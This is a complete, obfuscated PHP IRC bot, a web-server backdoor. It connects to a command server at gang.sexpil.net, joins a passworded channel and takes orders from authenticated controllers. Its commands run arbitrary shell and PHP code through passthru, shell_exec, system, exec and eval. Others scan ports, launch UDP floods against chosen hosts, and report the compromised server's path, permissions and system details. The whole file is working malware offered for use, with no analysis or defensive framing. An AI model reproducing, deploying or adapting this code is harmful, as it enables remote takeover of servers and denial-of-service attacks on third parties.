<?php set_time_limit(0); error_reporting(0);  class rfJNnrRfbjBVzVrzn {

 var $JBfFfVBZBbFffNZ = array("NvjBNzJRjJJJbBJR"=>"gang.sexpil.net",
                     "JJvn"=>"25343",
                     "nnnNR"=>"scary",
                     "rrZZFv"=>"13",
                     "pDLll"=>"#wWw#",
                     "FNJ"=>"scan",
                     "rrNnfBbvn"=>"41aa15390e2efa34ac693c3bd7cb8e88",
                     "VNfRJNjrNR"=>".",
                     "BBVVbfVnFvz"=>"a87710e60dee7645081a8fc2fab74dbd");
                      var $JRJfzZZvZVVBNFZnzj = array(); 
 function iqamAAuIQy($TP,$TXx)
 {
    $this->ImEuYMu("NOTICE $TP :$TXx");
 } function mUyAUQAUYeMuqIAIEae() {
	if (@ini_get("safe_mode") or strtolower(@ini_get("safe_mode")) == "on") { $PhTDDpdXDlh = "\0034ON\003"; } else { $PhTDDpdXDlh = "\0039OFF\003"; }

	$hplHLDdX = php_uname();
	if($hplHLDdX == "") { $ZvWkhl = "\00315---\003"; } else { $ZvWkhl = "\00315".$hplHLDdX."\003"; }
		 
	 $vrGc = "\00315http://".$_SERVER['SERVER_NAME']."".$_SERVER['REQUEST_URI']."\003";
	 
	 $DTSCo =  getcwd()."";
	 
	 $lKok = "\00315".$DTSCo."\003";

	$cocWkWCsgC = fileperms("$DTSCo");

	if (($cocWkWCsgC & 0xC000) == 0xC000) { $SScCsGWgcwK = 's';
	} elseif (($cocWkWCsgC & 0xA000) == 0xA000) { $SScCsGWgcwK = 'l';
	} elseif (($cocWkWCsgC & 0x8000) == 0x8000) { $SScCsGWgcwK = '-';
	} elseif (($cocWkWCsgC & 0x6000) == 0x6000) { $SScCsGWgcwK = 'b';
	} elseif (($cocWkWCsgC & 0x4000) == 0x4000) { $SScCsGWgcwK = 'd';
	} elseif (($cocWkWCsgC & 0x2000) == 0x2000) { $SScCsGWgcwK = 'c';
	} elseif (($cocWkWCsgC & 0x1000) == 0x1000) { $SScCsGWgcwK = 'p';
	} else { $SScCsGWgcwK = 'u'; }

	$SScCsGWgcwK .= (($cocWkWCsgC & 0x0100) ? 'r' : '-');
	$SScCsGWgcwK .= (($cocWkWCsgC & 0x0080) ? 'w' : '-');
	$SScCsGWgcwK .= (($cocWkWCsgC & 0x0040) ?	(($cocWkWCsgC & 0x0800) ? 's' : 'x' ) :	(($cocWkWCsgC & 0x0800) ? 'S' : '-'));

	$SScCsGWgcwK .= (($cocWkWCsgC & 0x0020) ? 'r' : '-');
	$SScCsGWgcwK .= (($cocWkWCsgC & 0x0010) ? 'w' : '-');
	$SScCsGWgcwK .= (($cocWkWCsgC & 0x0008) ?	(($cocWkWCsgC & 0x0400) ? 's' : 'x' ) :	(($cocWkWCsgC & 0x0400) ? 'S' : '-'));

	$SScCsGWgcwK .= (($cocWkWCsgC & 0x0004) ? 'r' : '-');
	$SScCsGWgcwK .= (($cocWkWCsgC & 0x0002) ? 'w' : '-');
	$SScCsGWgcwK .= (($cocWkWCsgC & 0x0001) ?	(($cocWkWCsgC & 0x0200) ? 't' : 'x' ) :	(($cocWkWCsgC & 0x0200) ? 'T' : '-'));
			
	$nFTH = "\00315".$SScCsGWgcwK."\003";

	$this->EMMyqEMEUEa($this->JBfFfVBZBbFffNZ['pDLll'],"\00314[SAFE:\003\002 $PhTDDpdXDlh\002\00314]\00315 $vrGc \00314[pwd:]\00315 $lKok \00314(\003$nFTH\00314) [uname:]\00315 $ZvWkhl");
 } function YEQuayMaAUIIEqMuUQ($xPlH,$LLXLPPlPLL,$MQyy) {
	$this->EMMyqEMEUEa($this->JBfFfVBZBbFffNZ['pDLll'],"[\002UdpFlood Gestart!\002]"); 
	$PLlPTxDXL = "";
	for($L=0;$L<$LLXLPPlPLL;$L++) { $PLlPTxDXL .= chr(mt_rand(1,256)); }
	$thDxH = time();
	$L = 0;
	while(time()-$thDxH < $MQyy) {
		$vx=fsockopen("udp://".$xPlH,mt_rand(0,6000),$e,$s,5);
      	fwrite($vx,$PLlPTxDXL);
       	fclose($vx);
		$L++;
	}
	$voX = $L * $LLXLPPlPLL;
	$voX = $voX / 1048576;
	$hZg = $voX / $MQyy;
	$hZg = round($hZg);
	$voX = round($voX);
	$this->EMMyqEMEUEa($this->JBfFfVBZBbFffNZ['pDLll'],"[\002UdpFlood Afgerond!\002]: $voX MB verzonden / gemiddelde: $hZg MB/s ");
 } function aqaEqyImAqAyIeUYi() {
  $llDHpD = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';	
  $xtxhxxp = strlen($llDHpD);
  for($L=0;$L<6;$L++) {
	$uII .= $llDHpD[rand(0,$xtxhxxp-1)];
  }
  if(php_uname() == "") { $hplHLDdX = "---"; } else { $hplHLDdX = php_uname(); }
  $this->ImEuYMu("USER ".$uII."-go 127.0.0.1 localhost :".$hplHLDdX."");
 } function AYqaqAqQEEaEY() 
 { 
    if(!($this->cksWkgWgo = fsockopen($this->JBfFfVBZBbFffNZ['NvjBNzJRjJJJbBJR'],$this->JBfFfVBZBbFffNZ['JJvn'],$e,$s,30))) 
    $this->AYqaqAqQEEaEY(); 
    $this->aqaEqyImAqAyIeUYi();
    if(strlen($this->JBfFfVBZBbFffNZ['nnnNR'])>0) 
    $this->ImEuYMu("PASS ".$this->JBfFfVBZBbFffNZ['nnnNR']);
    $this->QEaeeyyiqyAIEeii();
    $this->eqAAYauaIMYqeu();
 } function ImEuYMu($TXx) 
 { 
    fwrite($this->cksWkgWgo,"$TXx\r\n"); 
 } function ueEquIUYyyIQ($xPlH) 
 { 
    if(isset($this->JRJfzZZvZVVBNFZnzj[$xPlH])) 
       return 1; 
    else 
       return 0; 
 }function eqAAYauaIMYqeu() 
 { 
    while(!feof($this->cksWkgWgo)) 
    { 
       $this->emmaI = trim(fgets($this->cksWkgWgo,512)); 
       $JnrvBZZbrNZbV = explode(" ",$this->emmaI); 
       if(substr($this->emmaI,0,6)=="PING :") 
       { 
          $this->ImEuYMu("PONG :".substr($this->emmaI,6)); 
       } 
       if(isset($JnrvBZZbrNZbV[1]) && $JnrvBZZbrNZbV[1] =="004") 
       { 
          $this->ImEuYMu("JOIN ".$this->JBfFfVBZBbFffNZ['pDLll']." ".$this->JBfFfVBZBbFffNZ['FNJ']."");
          $this->AYaiye($this->JBfFfVBZBbFffNZ['pDLll'],$this->JBfFfVBZBbFffNZ['FNJ']);
          $this->mUyAUQAUYeMuqIAIEae();
       } 
       if(isset($JnrvBZZbrNZbV[1]) && $JnrvBZZbrNZbV[1]=="433") 
       { 
          $this->QEaeeyyiqyAIEeii(); 
       }
       if($this->emmaI != $fVv_LpX) 
       { 
          $NjFZBrNBrFvvNn = array(); 
          $Wcg = substr(strstr($this->emmaI," :"),2); 
          $wWsC = explode(" ",$Wcg); 
          $OwsKk = explode("!",$JnrvBZZbrNZbV[0]); 
          $gSCSwC = explode("@",$OwsKk[1]); 
          $gSCSwC = $gSCSwC[1]; 
          $OwsKk = substr($OwsKk[0],1); 
          $OWWkook = $JnrvBZZbrNZbV[0]; 
          if($wWsC[0]==$this->OwsKk) 
          { 
           for($L=0;$L<count($wWsC);$L++) 
              $NjFZBrNBrFvvNn[$L] = $wWsC[$L+1]; 
          } 
          else 
          { 
           for($L=0;$L<count($wWsC);$L++) 
              $NjFZBrNBrFvvNn[$L] = $wWsC[$L]; 
          } 
          if(count($JnrvBZZbrNZbV)>2) 
          { 
             switch($JnrvBZZbrNZbV[1]) 
             { 
                case "QUIT": 
                   if($this->ueEquIUYyyIQ($OWWkook)) 
                   { 
                      $this->eUmMmqYA($OWWkook); 
                   } 
                break; 
                case "PART": 
                   if($this->ueEquIUYyyIQ($OWWkook)) 
                   { 
                      $this->eUmMmqYA($OWWkook); 
                   } 
                break; 
                case "PRIVMSG": 
                   if(!$this->ueEquIUYyyIQ($OWWkook) && (md5($gSCSwC) == $this->JBfFfVBZBbFffNZ['BBVVbfVnFvz'] || $this->JBfFfVBZBbFffNZ['BBVVbfVnFvz'] == "*")) 
                   { 
                      if(substr($NjFZBrNBrFvvNn[0],0,1)==$this->JBfFfVBZBbFffNZ['VNfRJNjrNR']) 
                      { 
                         switch(substr($NjFZBrNBrFvvNn[0],1)) 
                         { 
                            case "user": 
                              if(md5($NjFZBrNBrFvvNn[1])==$this->JBfFfVBZBbFffNZ['rrNnfBbvn']) 
                              { 
                                 $this->Aaumaaaqe($OWWkook);
                              } 
                              else 
                              { 
                                 $this->iqamAAuIQy($this->JBfFfVBZBbFffNZ['pDLll'],"[\002Auth\002]: Fout password $OwsKk idioot!!");
                              } 
                            break; 
                         } 
                      } 
                   }
                   elseif($this->ueEquIUYyyIQ($OWWkook)) 
                   { 
                      if(substr($NjFZBrNBrFvvNn[0],0,1)==$this->JBfFfVBZBbFffNZ['VNfRJNjrNR']) 
                      { 
                         switch(substr($NjFZBrNBrFvvNn[0],1)) 
                         {                            case "restart": 
                               $this->ImEuYMu("QUIT :gerestart door $OwsKk");
                               fclose($this->cksWkgWgo); 
                               $this->AYqaqAqQEEaEY(); 
                            break;                            case "raw":
                               $this->ImEuYMu(strstr($Wcg,$NjFZBrNBrFvvNn[1])); 
                            break;                            case "dns": 
                               if(isset($NjFZBrNBrFvvNn[1])) 
                               { 
                                  $Wg = explode(".",$NjFZBrNBrFvvNn[1]); 
                                  if(count($Wg)==4 && is_numeric($Wg[0]) && is_numeric($Wg[1]) && is_numeric($Wg[2]) && is_numeric($Wg[3])) 
                                  { 
                                     $this->EMMyqEMEUEa($this->JBfFfVBZBbFffNZ['pDLll'],"[\002dns\002]: ".$NjFZBrNBrFvvNn[1]." => ".gethostbyaddr($NjFZBrNBrFvvNn[1])); 
                                  } 
                                  else 
                                  { 
                                     $this->EMMyqEMEUEa($this->JBfFfVBZBbFffNZ['pDLll'],"[\002dns\002]: ".$NjFZBrNBrFvvNn[1]." => ".gethostbyname($NjFZBrNBrFvvNn[1])); 
                                  } 
                               } 
                            break;                            case "rndnick": 
                               $this->QEaeeyyiqyAIEeii(); 
                            break;                            case "die": 
                               $this->ImEuYMu("QUIT :die command from $OwsKk");
                               fclose($this->cksWkgWgo); 
                               exit;                            case "passthru": 
                               $goKKggKscggs = substr(strstr($Wcg,$NjFZBrNBrFvvNn[0]),strlen($NjFZBrNBrFvvNn[0])+1); 

                               $WssSGKkCWKcKc = passthru($goKKggKscggs); 
                               $CskwccGSkoCSCs = explode("\n",$WssSGKkCWKcKc); 
                               for($L=0;$L<count($CskwccGSkoCSCs);$L++) 
                                  if($CskwccGSkoCSCs[$L]!=NULL) 
                                     $this->EMMyqEMEUEa($this->JBfFfVBZBbFffNZ['pDLll'],"      : ".trim($CskwccGSkoCSCs[$L])); 
                            break;                            case "pscan": 
                               if(count($NjFZBrNBrFvvNn) > 2) 
                               { 
                                  if(fsockopen($NjFZBrNBrFvvNn[1],$NjFZBrNBrFvvNn[2],$e,$s,15)) 
                                     $this->EMMyqEMEUEa($this->JBfFfVBZBbFffNZ['pDLll'],"[\002pscan\002]: ".$NjFZBrNBrFvvNn[1].":".$NjFZBrNBrFvvNn[2]." is \2open\2"); 
                                  else 
                                     $this->EMMyqEMEUEa($this->JBfFfVBZBbFffNZ['pDLll'],"[\002pscan\002]: ".$NjFZBrNBrFvvNn[1].":".$NjFZBrNBrFvvNn[2]." is \2closed\2"); 
                               } 
                            break;                            case "sexec":
                               $goKKggKscggs = substr(strstr($Wcg,$NjFZBrNBrFvvNn[0]),strlen($NjFZBrNBrFvvNn[0])+1); 
                               $WssSGKkCWKcKc = shell_exec($goKKggKscggs); 
                               $CskwccGSkoCSCs = explode("\n",$WssSGKkCWKcKc); 
                               for($L=0;$L<count($CskwccGSkoCSCs);$L++) 
                                  if($CskwccGSkoCSCs[$L]!=NULL) 
                                     $this->EMMyqEMEUEa($this->JBfFfVBZBbFffNZ['pDLll'],"      : ".trim($CskwccGSkoCSCs[$L])); 
                            break;                            case "eval":
                              $eval = eval(substr(strstr($Wcg,$NjFZBrNBrFvvNn[1]),strlen($NjFZBrNBrFvvNn[1])));
                            break;                            case "system": 
                               $goKKggKscggs = substr(strstr($Wcg,$NjFZBrNBrFvvNn[0]),strlen($NjFZBrNBrFvvNn[0])+1); 
                               $WssSGKkCWKcKc = system($goKKggKscggs); 
                               $CskwccGSkoCSCs = explode("\n",$WssSGKkCWKcKc); 
                               for($L=0;$L<count($CskwccGSkoCSCs);$L++) 
                                  if($CskwccGSkoCSCs[$L]!=NULL) 
                                     $this->EMMyqEMEUEa($this->JBfFfVBZBbFffNZ['pDLll'],"      : ".trim($CskwccGSkoCSCs[$L])); 
                            break;                            case "logout": 
                               $this->eUmMmqYA($OWWkook); 
                               $this->EMMyqEMEUEa($this->JBfFfVBZBbFffNZ['pDLll'],"[\002Auth\002]\00314 Je bent nu uitgelogt $OwsKk"); 
                            break;                            case "udpflood": 
                               if(count($NjFZBrNBrFvvNn)>3) 
                               { 
                                  $this->YEQuayMaAUIIEqMuUQ($NjFZBrNBrFvvNn[1],$NjFZBrNBrFvvNn[2],$NjFZBrNBrFvvNn[3]); 
                               } 
                            break;                            case "info":
                               $this->mUyAUQAUYeMuqIAIEae();
                            break;                            case "exec": 
                               $goKKggKscggs = substr(strstr($Wcg,$NjFZBrNBrFvvNn[0]),strlen($NjFZBrNBrFvvNn[0])+1); 
                               $WssSGKkCWKcKc = exec($goKKggKscggs); 
                               $CskwccGSkoCSCs = explode("\n",$WssSGKkCWKcKc); 
                               for($L=0;$L<count($CskwccGSkoCSCs);$L++) 
                                  if($CskwccGSkoCSCs[$L]!=NULL) 
                                     $this->EMMyqEMEUEa($this->JBfFfVBZBbFffNZ['pDLll'],"      : ".trim($CskwccGSkoCSCs[$L])); 
                            break;                         } 
                      } 
                   } 
                break; 
             } 
          } 
       } 
       $fVv_LpX = $this->emmaI; 
    } 
    $this->AYqaqAqQEEaEY(); 
 } function EMMyqEMEUEa($TP,$TXx)
 {
    $this->ImEuYMu("PRIVMSG $TP :$TXx");
 } function AYaiye($pDLll,$FNJ=NULL) 
 { 
    $this->ImEuYMu("JOIN $pDLll $FNJ"); 
 } function QEaeeyyiqyAIEeii() {
  $llDHpD = '[abcdefghijklm)nopqrstuvwxyz_ABCDEFGHIJKLM(NOPQRSTUVWXYZ-0123456789]';	
  $xtxhxxp = strlen($llDHpD);
  for($L=0;$L<$this->JBfFfVBZBbFffNZ['rrZZFv'];$L++) {
	$uII .= $llDHpD[rand(0,$xtxhxxp-1)];
  }
  $this->ImEuYMu("NICK ".$uII."");
 } function eUmMmqYA($xPlH) 
 { 
    unset($this->JRJfzZZvZVVBNFZnzj[$xPlH]); 
 } function Aaumaaaqe($xPlH) 
 { 
    $this->JRJfzZZvZVVBNFZnzj[$xPlH] = true; 
 }}
$CskOsskw = new rfJNnrRfbjBVzVrzn;
$CskOsskw->AYqaqAqQEEaEY(); ?>